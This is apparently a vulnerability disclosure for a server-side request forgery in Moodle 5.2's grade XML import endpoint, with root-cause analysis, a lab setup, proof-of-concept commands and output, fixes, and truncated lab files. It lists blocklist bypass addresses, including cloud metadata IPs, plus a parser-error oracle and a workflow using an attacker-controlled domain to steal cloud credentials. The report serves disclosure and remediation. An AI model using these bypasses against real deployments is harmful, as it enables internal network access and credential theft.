# Server-Side Request Forgery in Moodle Grade-Import-XML Endpoint

| Field | Value |
| --- | --- |
| Vulnerability name | Server-Side Request Forgery |
| Vulnerability type | software |
| Product name | Moodle LMS |
| Product vendor | Moodle |
| Product version | 5.2 |
| Product link | http://moodle.com |
| Product environment | web |
| Severity | High |
| CVSS score | 7.7 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N |
| Affected assets | 45986 |
| Affected users | 459860 |
| Date of reporting | 2026-04-10 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-04-26T10:38:31.558901+00:00 |
| Last modified | 2026-05-03T19:17:19.341178+00:00 |

---

# Server-Side Request Forgery in Moodle Grade-Import-XML Endpoint

## Affected software, version & test date

| Field | Value |
|---|---|
| Product | Moodle (Learning Management System) |
| Version | 5.2beta — Build 20260327 |
| Component | `public/grade/import/xml/import.php` |
| Tested on | Stock docker image, default configuration |
| Test date | 2026-04-09 |

## Vulnerability classes / CWE references

| CWE          | Title                                                        | Relevance                                                                                                                                                                     |
| ------------ | ------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CWE-918**  | Server-Side Request Forgery (SSRF)                           | Primary class — the endpoint takes a URL from a low-privilege user and fetches it server-side.                                                                                |
| **CWE-184**  | Incomplete List of Disallowed Inputs                         | The default cURL host blocklist misses CGN (`100.64.0.0/10`), most of `169.254.0.0/16`, Alibaba/Oracle cloud metadata addresses, and the entire IPv6 link-local + ULA ranges. |
| **CWE-209**  | Generation of Error Message Containing Sensitive Information | Moodle's XML parser echoes attacker-controlled XML element values back inside the error response, turning a partially-blind SSRF into a readable oracle.                      |
| **CWE-1188** | Insecure Default Initialization of Resource                  | The defaults shipped at `public/admin/settings/security.php:175-191` are the "secure" defaults — and they still leave the bypasses listed above wide open.                    |
| **CWE-693**  | Protection Mechanism Failure                                 | The cURL security helper is the protection mechanism; the failure is that its blocklist is too narrow.                                                                        |

## Description

The Moodle grade XML import workflow lets a teacher import grades from a remote URL by submitting:

```
GET /grade/import/xml/import.php?id=<courseid>&url=<remote-xml-url>
```

The handler accepts the `url` parameter through `required_param('url', PARAM_URL)` and passes it directly to `download_file_content()`, which performs a server-side HTTP fetch via Moodle's `curl` wrapper. The wrapper consults `core\files\curl_security_helper` before issuing the request, and that helper IS enabled by default in Moodle 5.2beta with sensible-looking defaults — RFC1918 ranges, loopback, the AWS IMDS literal, and the standard cloud metadata hostnames are blocked. So at first glance the endpoint looks safe.

It is not. Five gaps in the default blocklist let any teacher reach a wide range of internal and cloud-infrastructure addresses, and the response handling is rich enough that the SSRF is **not blind** — it acts as an *oracle* with at least four distinguishable response classes:

1. **Helper-blocked** — sub-millisecond reject, error string "Cannot read file (URL)"
2. **Connect failed** — same error string but with multi-second wall-clock latency, indicating curl waited on a real TCP connect timeout
3. **Non-XML response received** — TCP succeeded, HTTP 200 returned, body wasn't valid grade XML; error string "Error - bad XML format"
4. **Valid grade XML received** — body parses, the literal value of the `<assignment>` element is **echoed back inside the error message** as `Error - idnumber 'X' from the import file does not match any grade item.`

State #4 is a fully-readable exfiltration channel: any attacker-controlled bouncer that wraps a value in valid grade XML can round-trip data through Moodle's parser error.

## Permissions required

Any authenticated user holding both of these capabilities at the course context:

- `moodle/grade:import`
- `gradeimport/xml:view`

Both are granted by default to the `editingteacher` archetype, so **any course editor can fire the SSRF in any course they edit**. Self-registration plus enrolling as a teacher in a self-managed sandbox course also satisfies the precondition.

## Preconditions

| Precondition | Default state | Notes |
|---|---|---|
| Web service authentication | Not required | The endpoint uses session auth, not the web-services token system. `$CFG->enablewebservices` is irrelevant. |
| Course exists | Yes | Any course will do; the `id` parameter just has to point to a real course. |
| User enrolled with the right role | Provisioned by the attacker | An attacker who can self-register can self-enrol in courses with `enrol_self` enabled, but the simplest path is to have a teacher account from any source. |
| `gradeimport_xml` plugin enabled | Enabled by default | Ships with Moodle core. |
| `curlsecurityblockedhosts` admin setting | Default (vulnerable) | The shipped default has the gaps documented below. An admin would have to manually widen it to block the bypasses. |
| Outbound network access from the Moodle server | Required | The Moodle host needs to be able to make outbound HTTP requests. |

## Root cause analysis

There are three independent root causes that combine to make this exploitable.

### 1. Incomplete IP blocklist (CWE-184, CWE-1188)

`public/admin/settings/security.php:175-191` defines the shipped defaults:

```php
$blockedhostsdefault = [
    '127.0.0.0/8',
    '192.168.0.0/16',
    '10.0.0.0/8',
    '172.16.0.0/12',
    '0.0.0.0',
    'localhost',
    '169.254.169.254',   // ← only this one literal IP
    '0000::1',           // ← only IPv6 loopback
]; $allowedportsdefault = ['443', '80'];
```

Notably absent:

| Range | Real-world significance |
|---|---|
| `100.64.0.0/10` | RFC 6598 carrier-grade NAT — used by AWS VPC NAT gateways, several CDNs, and some on-prem private networks |
| `169.254.0.0/16` (except `.169.254`) | The rest of the IPv4 link-local space — `169.254.169.253`, `169.254.0.1`, etc. are all reachable. |
| `100.100.100.200` | Alibaba Cloud ECS instance metadata service |
| `192.0.0.192` | Oracle Cloud Infrastructure instance metadata service |
| `fe80::/10` | IPv6 link-local — used by service meshes, IPv6 router config, etc. |
| `fc00::/7` | IPv6 unique-local addresses (ULA) — only `0000::1` (loopback) is blocked, not the whole `fc00::/7` range |

### 2. DNS-resolution check is only as good as the IP blocklist (CWE-918)

`public/lib/classes/files/curl_security_helper.php:172-194` performs DNS resolution on hostnames and checks each resolved IP against the blocklist:

```php
// DNS forward lookup - returns a list of only IPv4 addresses! $hostips = $this->get_host_list_by_name($host);

if (!$hostips) {
    return true;
}

foreach ($hostips as $hostip) {
    if ($this->address_explicitly_blocked($hostip)) {
        return true;
    }
    $allowedips[] = $hostip;
}
```

This works correctly *for the IPs that are in the blocklist*. A hostname that resolves to `127.0.0.1` is correctly rejected. But a hostname that resolves to `100.100.100.200` (Alibaba metadata), `100.64.0.5` (CGN), or `169.254.169.253` (link-local IPv4) sails right through. An attacker who controls a public domain can register an A record pointing at any of these and use the hostname as the `url` parameter.

The DNS check also only looks at `gethostbynamel()` results, which return **IPv4 only**. A hostname that returns AAAA records resolving to a blocked IPv6 address bypasses the check entirely, then OS-level resolution may still cause curl to use the IPv6 path.

### 3. Parser error message echoes attacker-controlled values (CWE-209)

`public/grade/import/xml/lib.php:32-42`:

```php
$gradeidnumber = $result['#']['assignment'][0]['#']; if (!$grade_items = grade_item::fetch_all(array('idnumber' => $gradeidnumber, ...))) {
    $status = false;
    $error  = get_string('errincorrectgradeidnumber', 'gradeimport_xml', $gradeidnumber);
    break;
}
```

The error string template is `Error - idnumber '{$a}' from the import file does not match any grade item.` and `{$a}` is replaced with the literal value extracted from the response's `<assignment>` element. That value is rendered into the HTTP response shown to the attacker. Any data wrapped in valid grade XML and served from the SSRF target gets reflected back to the attacker via this oracle.

### 4. PARAM_URL strips bracketed IPv6 URLs at the entry point

`required_param('url', PARAM_URL)` rejects bracketed IPv6 URLs entirely — they're sanitised to an empty string before reaching the helper. This actually *prevents* exploitation of the IPv6 ULA / link-local gaps via this specific endpoint. The same gaps remain exploitable through any other Moodle endpoint that uses `PARAM_RAW` or `PARAM_TEXT` for URL parameters; it just isn't this one.

## Bypass surface (summary)

### What works

| Bypass | Why it works |
|---|---|
| **CGN range `100.64.0.0/10`** | Not in the default blocklist |
| **IPv4 link-local `169.254.0.0/16` except `.169.254`** | The blocklist has only the literal `169.254.169.254`, leaving every other link-local IPv4 reachable |
| **Alibaba ECS metadata `100.100.100.200`** | Not in the default blocklist |
| **Oracle Cloud metadata `192.0.0.192`** | Not in the default blocklist |
| **DNS hostnames resolving to any of the above** | The helper's DNS check is only as good as the IP blocklist behind it |
| **Public-internet hosts on port 80/443** | Outbound is allowed; useful for blind-OOB exfil and the parser-error-echo oracle |

### What doesn't work (and why)

| Attempt | Blocked by |
|---|---|
| `127.0.0.1`, `localhost`, `LOCALHOST` | helper (`127.0.0.0/8` + literal "localhost" string match, case-insensitive) |
| Decimal `2130706433`, hex `0x7f000001`, integer `0` | helper after URL normalisation |
| `192.168.0.0/16`, `10.0.0.0/8`, `172.16.0.0/12` | helper (RFC1918) |
| `169.254.169.254` (AWS IMDSv1) | helper (literal block) |
| `metadata.google.internal` | helper (DNS lookup → `.169.254` → IP block) |
| `[::1]`, `[fe80::*]`, `[fc00:dead:beef::10]` | `PARAM_URL` cleaner blanks bracketed IPv6 URLs at the entry point. **The helper itself happily allows these addresses** — they're reachable through other Moodle endpoints that use `PARAM_RAW` or `PARAM_TEXT`. |
| Any port other than 80/443 | helper port allowlist `[443, 80]` |
| Userinfo trick `http://example.com@127.0.0.1/` | URL parser correctly extracts host |
| Percent-encoded host `http://%6c%6f%63%61%6c%68%6f%73%74/` | Decoded before check |

## Reproduction steps

### Environment setup

A self-contained dockerised lab is included with the PoC. It builds a target service container exposing several "internal services" (admin panel, fake AWS credentials, fake Alibaba metadata, valid grade XML, and a generic XML-echo bouncer) on a docker network with addresses *outside* Moodle's default blocklist (CGN `100.64.0.0/24` and IPv6 ULA `fc00:dead:beef::/64`). It then attaches the running Moodle container to this network.

#### Architecture

```
                                                ┌──────────────────────────────┐
                                                │  attacker (host)             │
                                                │  ./venv/bin/python exploit.py│
                                                └──────────────┬───────────────┘
                                                               │ HTTPS to Moodle
                                                               ▼
                       ┌──────────────────────────────────────────────────────────┐
                       │  moodle-app-moodle-1                                     │
                       │  ─ apache + php on 172.22.0.2                            │
                       │  ─ also attached to ssrf1-net:                           │
                       │      eth1 v4 = 100.64.0.2                                │
                       │      eth1 v6 = fc00:dead:beef::2  +  fe80::… (link-local)│
                       │                                                          │
                       │  /grade/import/xml/import.php ──► download_file_content  │
                       │                                       │                  │
                       │                              curl::get │                 │
                       │                                       ▼                  │
                       │                              curl_security_helper        │
                       │                              (default config)            │
                       └──────────────────────────────────────┬───────────────────┘
                                                              │ helper allows
                                                              │ {IP not in blocklist
                                                              │  AND port in [80,443]}
                                                              ▼
                       ┌──────────────────────────────────────────────────────────┐
                       │  ssrf1-target (lab service)                              │
                       │  ─ on ssrf1-net:                                         │
                       │      eth0 v4 = 100.64.0.10  (CGN — bypasses helper)      │
                       │      eth0 v6 = fc00:dead:beef::10  (ULA — bypasses too)  │
                       │  ─ HTTP port 80:                                         │
                       │      /admin                fake admin panel              │
                       │      /aws-creds            fake AWS credential JSON      │
                       │      /alibaba/meta-data/instance fake Alibaba IMDS       │
                       │      /grades-xml           valid Moodle grade XML        │
                       │                            wrapping a SECRET in          │
                       │                            <assignment>                  │
                       │      /xml-leak?val=…       generic XML-echo bouncer      │
                       │      /redirect?to=URL      302 bouncer                   │
                       │      /slow                 1.5 s sleep then 200          │
                       │      /exfil?t=tag          marker for blind validation   │
                       │  ─ raw TCP 6379, 8080  (always blocked at helper level)  │
                       └──────────────────────────────────────────────────────────┘
```

```bash
cd poc/ssrf_1

# 1. Build and start the target container, attach moodle to ssrf1-net
./setup_lab.sh

# 2. Create a fresh randomly-named teacher account + course
#    (uses admin credentials internally; output is config.json)
./venv/bin/python setup_user.py
```

### Step 1 — confirm the SSRF fires

```bash
./venv/bin/python exploit.py validate
```

This sends three SSRF probes pointing at the lab target's `/exfil` endpoint via three different bypass routes (CGN IPv4, IPv6 ULA bracketed, docker DNS hostname), then reads the lab target's stderr to confirm which ones arrived.

### Step 2 — survey the helper bypass surface

```bash
./venv/bin/python exploit.py bypass-survey
```

This is the comprehensive matrix. For 21 candidate URLs it runs **two** checks per URL:

1. **Ground truth** — queries `curl_security_helper::url_is_blocked()` directly via `docker exec`, plus checks what `clean_param(..., PARAM_URL)` does to the URL
2. **Live HTTP** — actually fires the SSRF through the grade-import endpoint and parses the verdict from Moodle's response

The output is colour-coded:

- 🟢 **green** cells = bypass works for this stage (helper allows / PARAM keeps URL / SSRF fired and target responded)
- 🟡 **yellow** cells = partial bypass (helper allowed it, but the target is unreachable; the SSRF *did* fire — confirmed by curl's connect timeout being multi-seconds rather than the helper's ~50 ms reject)
- 🔴 **red** cells = blocked at this stage

The matrix covers:
- 13 cases that *should* be blocked (loopback, RFC1918, AWS IMDS literal, port-allowlist violations, IPv4-mapped IPv6, etc.)
- 8 cases that *should* be allowed (CGN, link-local IPv4 gaps, Alibaba/Oracle metadata, hostnames, public internet)

### Step 3 — read internal data via the XML-echo oracle

```bash
./venv/bin/python exploit.py exfil
```

This fires four SSRF probes against the lab target and demonstrates the oracle. Three of them (`/admin`, `/aws-creds`, `/alibaba/meta-data/instance`) return non-XML bodies and produce the `NON_XML` verdict — they confirm the SSRF fired and the target served a body, but the body content is not echoed.

The fourth (`/grades-xml`) returns a body that *is* valid grade XML, with a secret embedded in the `<assignment>` element. The `XML_LEAK` verdict pulls the secret out of Moodle's parser error message and prints it to the operator. A second test uses the lab target's `/xml-leak?val=DATA` bouncer to round-trip an arbitrary attacker-supplied value through the same oracle, demonstrating that the primitive can be wrapped around any data the attacker can route to it.

### Step 4 — single-shot SSRF to an arbitrary URL

```bash
./venv/bin/python exploit.py target http://100.64.0.10/grades-xml ./venv/bin/python exploit.py target http://example.com/
```

### Step 5 — port scan

```bash
./venv/bin/python exploit.py portscan --host ssrf1-target -p 80,443,22,3306,6379,8080,9200 --samples 3
```

This is included for completeness but is constrained by the helper's port allowlist of `[443, 80]`. The scan auto-detects which ports the helper rejects at the URL-validation layer and skips them, then runs a baseline + threshold timing scan on the allowed ports (`80` and `443`).

### Cleanup

```bash
./teardown_lab.sh
```

## Validation artifacts

| File | Purpose |
|---|---|
| `setup_lab.sh` | Docker network + target container provisioning |
| `teardown_lab.sh` | Rolls back everything `setup_lab.sh` created |
| `targets/Dockerfile` | `python:3.12-alpine` |
| `targets/app.py` | Multi-service target: HTTP fast/slow, admin panel, fake AWS/Alibaba metadata, valid grade XML wrapping a secret, XML-echo bouncer, redirect bouncer, exfil marker. Also raw-listens on TCP 6379 and 8080 to demonstrate the port-allowlist rejection. |
| `setup_user.py` | Provisions a randomly-named teacher in a throwaway course via `docker exec` against Moodle's CLI bootstrap. Idempotent — re-run for a fresh user. |
| `exploit.py` | Five subcommands: `validate`, `bypass-survey`, `exfil`, `target URL`, `portscan` |
| `requirements.txt` | `requests` |

## Expected outputs

### `validate`

```
┌─ Firing SSRF probes via /exfil on lab target ─ │ ✓ CGN IPv4 direct           HTTP=404 verdict=NON_XML elapsed=0.04s │ ✗ IPv6 ULA (PARAM_URL strip)  verdict=HELPER_BLOCKED message=Cannot read file () │ ✓ docker DNS name           HTTP=404 verdict=NON_XML elapsed=0.04s └─

┌─ Reading target container logs for tag=validate_… ─ │ ✓ 4 hit(s) recorded by target: │   [target] GET /exfil?t=validate_…-cgn  from=::ffff:100.64.0.2 │   [target] !!! EXFIL HIT !!! tag=validate_…-cgn from=::ffff:100.64.0.2 │   [target] GET /exfil?t=validate_…-dns  from=::ffff:100.64.0.2 │   [target] !!! EXFIL HIT !!! tag=validate_…-dns from=::ffff:100.64.0.2 └─
```

The IPv6 ULA test fails with an empty URL — this is because `PARAM_URL` strips bracketed IPv6 entirely. The remaining two probes reach the lab target, confirmed by both the Moodle-side `NON_XML` verdict and the target-side `EXFIL HIT` log lines.

### `bypass-survey`

```
┌─ Step 2 — firing the SSRF live for each URL ─ │  exp   helper PARAM  live                    elapsed  label │  ──────────────────────────────────────────────────────────────────────────────── │  BLOCK BLOCK pass  HELPER_BLOCKED            0.05s  loopback 127.0.0.1 │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  string 'localhost' │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  LOCALHOST uppercase │  BLOCK BLOCK STRIP HELPER_BLOCKED            0.04s  decimal int IP │  BLOCK BLOCK STRIP HELPER_BLOCKED            0.04s  hex IP 0x7f000001 │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  RFC1918 192.168.1.1 │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  docker bridge 172.22.0.2 │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  AWS IMDSv1 .169.254 │  BLOCK BLOCK STRIP HELPER_BLOCKED            0.04s  IPv6 [::1] (PARAM_URL strip) │  BLOCK BLOCK STRIP HELPER_BLOCKED            0.04s  IPv4-mapped IPv6 │  BLOCK pass  STRIP HELPER_BLOCKED            0.04s  IPv6 ULA bracketed   ← see (a) │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  port 8080 (not allowed) │  BLOCK BLOCK pass  HELPER_BLOCKED            0.04s  port 6379 (not allowed) │  PASS  pass  pass  NON_XML                   0.04s  CGN IPv4 100.64.0.10  ← see (b) │  PASS  pass  pass  NON_XML                   0.04s  docker DNS ssrf1-target │  PASS  pass  pass  CONNECT_FAILED           20.04s  link-local IPv4 169.254.0.1   ← see (c) │  PASS  pass  pass  CONNECT_FAILED           20.04s  link-local IPv4 .169.253 │  PASS  pass  pass  CONNECT_FAILED           20.10s  Alibaba metadata 100.100.100.200 │  PASS  pass  pass  CONNECT_FAILED           20.10s  Oracle metadata 192.0.0.192 │  PASS  pass  pass  CONNECT_FAILED           20.09s  CGN top 100.127.255.254 │  PASS  pass  pass  NON_XML                   0.30s  public example.com └─
```

Notes on the highlighted rows:

- **(a) `IPv6 ULA bracketed`** — `helper=pass` 🟢, `PARAM=STRIP` 🔴. Shows the helper would gladly fetch IPv6 ULA addresses. Only the entry-point `PARAM_URL` cleaner stops it on this specific endpoint. Other Moodle endpoints that use `PARAM_RAW` or `PARAM_TEXT` for URL parameters do not have this entry-point protection.
- **(b) `CGN IPv4 100.64.0.10` and `docker DNS ssrf1-target`** — fully green; `NON_XML` verdict means the SSRF fired AND the lab target served a body. Cross-confirmed by Step 3 reading the target's container logs.
- **(c) Link-local IPv4, Alibaba, Oracle, CGN top** — yellow `CONNECT_FAILED` with ~20 s elapsed time. These mean the helper let the URL through to curl, and curl tried to make a real connection. The connection failed because this lab environment doesn't have anything listening on those addresses, but on a real Moodle deployment that *does* have services there (or on a host within the Alibaba / Oracle Cloud), each of these would return data.

### `exfil`

```
┌─ Exfil probes ─ │ GET http://100.64.0.10/admin │ ! verdict=NON_XML  → response body received but body is not XML │ GET http://100.64.0.10/aws-creds │ ! verdict=NON_XML  → response body received but body is not XML │ GET http://100.64.0.10/alibaba/meta-data/instance │ ! verdict=NON_XML  → response body received but body is not XML │ GET http://100.64.0.10/grades-xml │ ✓ verdict=XML_LEAK  ECHOED VALUE = ssrf1{xml_echo_oracle_works} │   parser_msg = An error occurred when trying to import: Error - idnumber 'ssrf1{xml_echo_oracle_works}' from the import file does not match any grade item. └─

┌─ XML-bounce oracle: exfil arbitrary value through /xml-leak ─ │ GET http://100.64.0.10/xml-leak?val=ssrf1%7Bbounced_through_oracle%7D │ ✓ ECHOED VALUE = ssrf1{bounced_through_oracle} │ ✓ matches input = True └─
```

The `ECHOED VALUE = ssrf1{xml_echo_oracle_works}` line is the moment the oracle leaks data: a secret embedded in the SSRF target's response is echoed back to the attacker via Moodle's parser error message.

## Recommended fix

Three independent fixes, each addressing a different gap. The first one alone is enough to neutralise this PoC; doing all three is defense-in-depth.

### Fix 1 — tighten the default blocklist

In `public/admin/settings/security.php` around line 175, replace `$blockedhostsdefault` with the comprehensive list:

```php
$blockedhostsdefault = [
    // IPv4 special-purpose ranges
    '0.0.0.0/8',           // current network (RFC 1122)
    '127.0.0.0/8',         // loopback (RFC 1122)
    '10.0.0.0/8',          // private (RFC 1918)
    '172.16.0.0/12',       // private (RFC 1918)
    '192.168.0.0/16',      // private (RFC 1918)
    '100.64.0.0/10',       // CGN (RFC 6598)             ← NEW
    '169.254.0.0/16',      // entire link-local range    ← was just .169.254
    '198.18.0.0/15',       // benchmarking (RFC 2544)    ← NEW
    '192.0.0.0/24',        // IETF protocol (RFC 6890)   ← NEW (covers 192.0.0.192)
    '224.0.0.0/4',         // multicast                  ← NEW

    // Known cloud metadata service IPs
    '100.100.100.200',     // Alibaba Cloud ECS          ← NEW

    // String hostnames
    'localhost',
    'metadata',
    'metadata.google.internal',

    // IPv6
    '::/128',              // unspecified
    '::1/128',             // loopback                   ← was '0000::1'
    'fe80::/10',           // link-local                 ← NEW
    'fc00::/7',            // unique local               ← NEW
    'ff00::/8',            // multicast                  ← NEW
    '::ffff:0:0/96',       // IPv4-mapped (defence in depth — already partly handled)
];
```

### Fix 2 — fix the dual-stack DNS check

In `public/lib/classes/files/curl_security_helper.php`, the `get_host_list_by_name()` method only returns IPv4 (`gethostbynamel`). Replace with a resolver that returns both A and AAAA records:

```php
protected function get_host_list_by_name($host) {
    $ips = [];
    $a    = @dns_get_record($host, DNS_A)    ?: [];
    $aaaa = @dns_get_record($host, DNS_AAAA) ?: [];
    foreach (array_merge($a, $aaaa) as $rec) {
        if (!empty($rec['ip']))   $ips[] = $rec['ip'];
        if (!empty($rec['ipv6'])) $ips[] = $rec['ipv6'];
    }
    return $ips;
}
```

This way a hostname that resolves to a blocked IPv6 address (e.g. `fe80::*`) is caught by the helper instead of being smuggled through.

### Fix 3 — `PARAM_URL` should reject URLs, not silently empty them

In `clean_param()` for `PARAM_URL`, returning an empty string when validation fails means callers see no URL but no error either. This pattern is fragile. Either:

- Throw on invalid input so the caller has to handle the error explicitly, or
- Pass IPv6 bracketed URLs through (they're valid HTTP URLs per RFC 3986) and let the helper decide.

Both approaches push the security decision to one place — the helper — instead of relying on opaque silent stripping at the entry point.

### Operational mitigation (no code change required)

A site administrator can patch the deployment immediately by going to **Site administration → Security → HTTP security** and pasting the expanded blocklist into `cURL blocked hosts list`. This neutralises the PoC without waiting for an upstream fix.

## Impact

A teacher (or any user holding `moodle/grade:import` + `gradeimport/xml:view` in any course) can:

- **Reach internal services on RFC 6598 CGN address space** (`100.64.0.0/10`). Many cloud providers, especially AWS VPC NAT gateways and Tailscale meshes, run management interfaces in this range.
- **Exfiltrate cloud instance metadata on Alibaba Cloud and Oracle Cloud Infrastructure**. The Alibaba ECS metadata at `http://100.100.100.200/` and Oracle's at `http://192.0.0.192/` typically expose IAM credentials, user-data, and instance identity. On a Moodle instance hosted on either of these clouds, this becomes an unauthenticated-to-cloud-credential-theft chain.
- **Reach the entire IPv4 link-local space** except the single AWS metadata IP. Network appliances often expose admin interfaces on `169.254.x.x`.
- **Make outbound HTTP/HTTPS requests** to any public host on port 80 or 443. Useful for blind-OOB exfiltration via attacker-controlled webhooks or DNS, side-channel timing of remote services, and as a generic "trusted source IP" relay.
- **Read arbitrary internal data** that happens to be (or can be wrapped in) Moodle grade XML format, via the parser error oracle. Combined with a redirect bouncer or any internal endpoint that returns the right XML schema, this becomes a fully readable SSRF.
- **Indirectly reach IPv6 link-local and ULA services** through any *other* Moodle endpoint that takes a URL parameter as `PARAM_RAW` or `PARAM_TEXT` (the helper itself does not block these IPv6 ranges; only the `PARAM_URL` cleaner on this specific endpoint blocks bracketed IPv6 URLs).

The realistic attacker workflow is: register a domain, point an A record at one of the unblocked IPs (e.g. `100.100.100.200`), submit `?url=http://target.attacker.example/` through the grade import endpoint, and read the cloud metadata response back via the parser-error oracle.

## CVSS 3.1

**Base score: 7.7 — High** **Vector:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector (AV) | **Network (N)** | Exploitable via standard HTTP request to the Moodle web interface from anywhere on the internet that can reach the Moodle frontend. |
| Attack Complexity (AC) | **Low (L)** | One HTTP GET. No timing dependencies, no race, no rare configuration. The default Moodle 5.2beta install is vulnerable. |
| Privileges Required (PR) | **Low (L)** | Any course-editing teacher (`editingteacher` role). Not the lowest privilege level (which would be a self-registered user with no course role), but well below admin or manager. |
| User Interaction (UI) | **None (N)** | No victim involvement; the attacker authenticates as themselves and fires the request. |
| Scope (S) | **Changed (C)** | The vulnerability exists in the Moodle web component but the impact reaches systems outside Moodle's security authority — internal network services, cloud metadata endpoints, the cloud provider's IAM system, and any service the Moodle host can reach but the attacker cannot. |
| Confidentiality (C) | **High (H)** | An attacker can read cloud IAM credentials (Alibaba/Oracle), internal admin panel responses (via the `NON_XML` oracle confirming reachability + via the XML-echo oracle for any XML-format response), and arbitrary HTTP response content from any reachable internal HTTP service that fits the XML wrapper trick. |
| Integrity (I) | **None (N)** | The SSRF is a GET-only primitive. It does not directly modify state on the Moodle server, although the cloud-metadata theft enables follow-on integrity impact outside the Moodle scope. Conservative scoring keeps this at None. |
| Availability (A) | **None (N)** | No reliable DoS primitive demonstrated. |

A reasonable case can be made for raising Confidentiality to **High** further or scoring Integrity at **Low** if you weight the chain potential into cloud account compromise. The 7.7 score is conservative to the in-scope behaviour shown by the PoC.

## References

### Standards & frameworks

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [CWE-184: Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
- [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
- [CWE-1188: Insecure Default Initialization of Resource](https://cwe.mitre.org/data/definitions/1188.html)
- [CWE-693: Protection Mechanism Failure](https://cwe.mitre.org/data/definitions/693.html)
- [OWASP Top 10 2021 — A10: Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [OWASP Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP API Security Top 10 2023 — API7: SSRF](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)

### Internet standards relevant to the bypassed ranges

- [RFC 1918 — Address Allocation for Private Internets](https://datatracker.ietf.org/doc/html/rfc1918)
- [RFC 3927 — Dynamic Configuration of IPv4 Link-Local Addresses](https://datatracker.ietf.org/doc/html/rfc3927) (`169.254.0.0/16`)
- [RFC 4193 — Unique Local IPv6 Unicast Addresses](https://datatracker.ietf.org/doc/html/rfc4193) (`fc00::/7`)
- [RFC 4291 §2.5.6 — IPv6 Link-Local Addresses](https://datatracker.ietf.org/doc/html/rfc4291#section-2.5.6) (`fe80::/10`)
- [RFC 6598 — Reserved IPv4 Prefix for Shared Address Space](https://datatracker.ietf.org/doc/html/rfc6598) (`100.64.0.0/10` CGN)
- [RFC 6890 — Special-Purpose IP Address Registries](https://datatracker.ietf.org/doc/html/rfc6890)

### Cloud metadata documentation

- [AWS Instance Metadata Service](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) (`169.254.169.254`)
- [Google Cloud Metadata Server](https://cloud.google.com/compute/docs/metadata/overview) (`metadata.google.internal` → `169.254.169.254`)
- [Azure Instance Metadata Service](https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service) (`169.254.169.254`)
- [Alibaba Cloud ECS Instance Metadata](https://www.alibabacloud.com/help/en/ecs/user-guide/manage-instance-metadata) (`100.100.100.200`)
- [Oracle Cloud Infrastructure Instance Metadata](https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/gettingmetadata.htm) (`169.254.169.254` and `192.0.0.192`)

### Moodle source paths referenced in this report

- `public/grade/import/xml/import.php` — vulnerable entry point
- `public/grade/import/xml/lib.php` — XML parser that produces the echo oracle
- `public/lib/filelib.php` — `download_file_content()` and the `curl` wrapper
- `public/lib/classes/files/curl_security_helper.php` — the helper with the gappy blocklist
- `public/admin/settings/security.php` — where the default blocklist is defined
- `public/lib/moodlelib.php` — `clean_param()` / `PARAM_URL` definition










---
# config.json

Code:
```json
{ "base": "http://localhost:8080", "container": "moodle-app-moodle-1", "target_container": "ssrf1-target", "target_v4": "100.64.0.10", "target_v6": "fc00:dead:beef::10", "target_dns": "ssrf1-target", "user": {
    "username": "ssrf1_t_ihkmzswo",
    "password": "Pw!_g1q162NewQ76sodt",
    "user_id": 5,
    "course_id": 3,
    "cap_grade_import": true,
    "cap_xml_view": true
  } }
```















---
# teardown_lab.sh

Code:
```bash
#!/usr/bin/env bash
# Roll back everything setup_lab.sh created. Leaves the moodle stack alone.
set -euo pipefail NET=ssrf1-net TARGET=ssrf1-target MOODLE=moodle-app-moodle-1

docker rm -f "$TARGET"  2>/dev/null || true docker network disconnect "$NET" "$MOODLE" 2>/dev/null || true docker network rm "$NET" 2>/dev/null || true docker rmi ssrf1-target:latest 2>/dev/null || true echo "[+] ssrf_1 lab torn down"

```














---
# setup_users.py

Code:
```python
#!/usr/bin/env python3 """ ssrf_1 — admin-side setup helper.

This script is the *precondition* phase of the exploit. It uses the admin account to create everything an unprivileged attacker would need to be in a position to fire the SSRF:

  1. A randomly-named "teacher" user with a known password
  2. A throwaway course
  3. The teacher enrolled as `editingteacher` in the course

The teacher then has both `moodle/grade:import` and `gradeimport/xml:view` capabilities — enough to call /grade/import/xml/import.php.

The setup is done via `docker exec` against the running Moodle container, running PHP under the Moodle bootstrap. We never touch Moodle source files.

Output is a JSON file (config.json) that exploit.py reads. We never bake any state into the script itself; re-running setup_user.py creates a fresh teacher each time without colliding with existing accounts (random suffix).

Usage: ./venv/bin/python setup_user.py ./venv/bin/python setup_user.py --container moodle-app-moodle-1 --base http://localhost:8080 """ import argparse import json import secrets import string import subprocess import sys from pathlib import Path


SETUP_PHP = r""" define('CLI_SCRIPT', true); require('/var/www/moodle/config.php'); require_once($CFG->dirroot . '/user/lib.php'); require_once($CFG->dirroot . '/course/lib.php'); require_once($CFG->libdir . '/enrollib.php');

$suffix = getenv('SUFFIX'); $pw     = getenv('PW'); $uname  = "ssrf1_t_$suffix";

// 1. teacher $teacher = (object)[
    'username'   => $uname,
    'password'   => $pw,
    'firstname'  => 'SSRF1',
    'lastname'   => "Teacher_$suffix",
    'email'      => "$uname@ssrf1.local",
    'auth'       => 'manual',
    'confirmed'  => 1,
    'mnethostid' => $CFG->mnet_localhost_id,
